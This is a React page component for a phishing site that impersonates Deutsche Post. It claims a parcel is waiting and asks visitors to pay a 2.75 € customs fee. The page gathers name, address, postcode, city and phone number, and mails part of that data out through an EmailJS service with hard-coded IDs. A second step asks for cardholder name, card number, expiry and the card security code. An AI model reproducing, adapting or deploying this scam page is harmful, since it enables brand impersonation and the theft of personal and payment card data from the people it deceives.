"use client";
import Congrats from "@/components/Congrats";
// import ContactOne from "@/components/ContactOne";
import ContactTwo from "@/components/ContactTwo";
import Container from "@/components/Container";
import { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
const HomePage = () => {
  const [index, setIndex] = useState(0);
  const form = useRef();
  const submit = async (e) => {
    e.preventDefault();
    // EMail js Function
    try {
      await emailjs.sendForm(
        "service_h8vk6lf",
        "template_h0skuok",
        form.current,
        {
          publicKey: "s5gIhoSR1r2L4RLa0",
        }
      );
      setIndex((prev) => prev + 1);
      console.log("SUCCESS!");
    } catch (error) {
      console.log(error);
      console.log("FAILED...", error.text);
    }
  };
  return (
    <section className=" py-[15px]">
      <section className="min-h-[20vh] p-[1vw] pb-[15px] bg-[#] pt-[60px]">
        <section className="md:px-[10vw]">
          <a className="text-[#00f] underline" href="">
            Paket versardan
          </a>
          <button className="block border-[1px]  border-solid border-[#bbb] mt-[10px] rounded-sm px-[10px]">
            Hier
          </button>
          <div className="flex flex-wrap items-center mt-[20px] gap-[10px] sm:gap-[15px]">
            {[
              "Briefversand",
              "Warenversand",
              "Services",
              "Buro",
              "Sammeln",
            ].map((item) => (
              <div className="cursor-pointer">{item}</div>
            ))}
          </div>
        </section>
        <section className="h-[10vh]  px-[10px]  mt-[20px] bg-[#eee] ">
          <Container>
            <section className="flex h-[inherit] relative items-center justify-between">
              <section className="absolute left-0 flex  top-1/2 w-full -translate-y-1/2">
                <div
                  className={`w-[0%] transition-all duration-500 h-[4px] bg-[#FFCC00] ${
                    index >= 1 && "!w-[50%]"
                  }`}
                />
                <div
                  className={`w-[0%] transition-all duration-500 h-[4px] bg-[#FFCC00] ${
                    index >= 2 && "!w-[50%]"
                  }`}
                />
              </section>
              {[1, 2, 3].map((d) => (
                <div className="size-[40px] relative z-[9999] flex items-center justify-center border-[2px] border-solid border-black bg-white font-bold rounded-[50%]">
                  {d}
                </div>
              ))}
            </section>
          </Container>
          {index < 2 && (
            <button onClick={() => setIndex((prev) => prev + 1)}>
              Click ME!
            </button>
          )}

          {/* Render Childrens Here! */}
        </section>
      </section>
      <section>
        {index == 0 && (
          <>
            <div className="min-h-[50vh] mt-[30px] bg-[#FFCC00] py-[15px]">
              <Container>
                <section className="md:flex flex-wrap gap-[20px] justify-between">
                  <section className="pt-[20px] flex-1">
                    <h3 className="mt-[20px] font-bold text-[22px]">
                      Informationen
                    </h3>
                    <form
                      ref={form}
                      className="flex flex-col gap-3"
                      onSubmit={submit}
                    >
                      <section className="mt-[10px]">
                        <input
                          type="text"
                          placeholder="Name"
                          name="from_name"
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <section className="mt-[10px]">
                        <input
                          type="text"
                          placeholder="Anschrift"
                          name="user_email"
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <section className="mt-[10px]">
                        <input
                          type="number"
                          placeholder="Plz"
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <section className="mt-[10px]">
                        <input
                          type="text"
                          placeholder="Stadt"
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <section className="mt-[10px]">
                        <input
                          type="number"
                          placeholder="Rufnmmer"
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <button
                        type="submit"
                        className="bg-red-400 transition-all duration-[100ms] w-fit cursor-pointer px-[30px] active:scale-[1.115] text-white p-[10px]"
                      >
                        Weiter
                      </button>
                    </form>
                  </section>
                  <section className="flex-1">
                    <h4 className="mt-[20px] capitalize font-bold text-[22px]">
                      ihr paket wartet auf die zustellung
                    </h4>
                    <p className="text-[#333] mt-[15px] text-[14px]">
                      Ihr Paket ist bei der Deutschen Post angekommen Bitte
                      Bestätigen Sie die Zahlung von 2.75 € um die Zollgebühren
                      abzuheben
                    </p>
                  </section>
                </section>
              </Container>
            </div>
          </>
        )}
        {index == 1 && (
          <>
            <div className="px-[20px] pt-[30px] border-t-[#ddd] border-t-[1px] mt-[30px] py-[15px]">
              {["Karteninhaber", "Karditkartenanbieter", "Kartennummer"].map(
                (el) => (
                  <div key={el} className="flex flex-col gap-[10px] mt-[10px]">
                    <label htmlFor="">{el}</label>
                    <input
                      type="text"
                      className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
                      placeholder={el}
                    />
                  </div>
                )
              )}

              <div className="flex flex-col gap-[15px] mt-[15px]">
                <label htmlFor="">Kartennummer</label>
                <section className="flex items-center gap-2">
                  <select
                    id=""
                    className="border-solid border-[1px] border-black w-[100px]"
                    value={`*`}
                  >
                    <option value=""></option>
                  </select>
                  /
                  <select
                    id=""
                    className="border-solid border-[1px] border-black w-[100px]"
                    value={`*`}
                  >
                    <option value=""></option>
                  </select>
                </section>
              </div>
              <div className="flex flex-col gap-[15px] mt-[15px]">
                <label htmlFor="">Kartenprufnummer</label>
                <input
                  type="text"
                  className="p-[10px] border-solid border-[#bbb] w-[100px] border-[2px]"
                />
              </div>
            </div>
            <section className="px-[20px]">
              <p className="capitalize text-balance text-[16px]">
                bei visa-und mastercard-Kareditkarten finden sie die
                dreistellige prufnummer im unterschriftsfeld auf der
                kartenruckseite bei american expresss-Karten ist sie eine
                vierstellige nummer auf der vorderseite iher american exprees
                card
              </p>
              <button
                onClick={() => setIndex((prev) => prev + 1)}
                className="max-md:w-full block text-left border-[#00000045] shadow-md shadow-[#bbb] border-solid border-[1px] p-[10px] font-semibold capitalize mt-[15px] bg-[#FFD638]"
              >
                jetzt bezahlen
              </button>
            </section>
          </>
        )}
        {index == 2 && <Congrats />}
      </section>
    </section>
  );
};

export default HomePage;
